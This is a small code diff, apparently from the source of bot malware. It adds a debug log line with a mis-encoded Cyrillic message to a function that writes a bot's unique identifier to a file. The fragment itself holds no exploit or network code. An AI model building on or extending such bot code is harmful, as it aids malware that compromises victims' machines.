@@ -191,6 +191,9 @@ static bool UID_To_File(char* BotUid)
 				GenerateUid(_BotUid);
 				BotUid = _BotUid;
 			}
+
+			DBG( "JavaPatcher", ">>>>>>>>>>>>>>> Ïèøåì óèä â ôàéë  %s", BotUid);
+
 			if( File::WriteBufferA( uidTxt, BotUid, m_lstrlen(BotUid) ) > 0 )
 				return true;
 		}
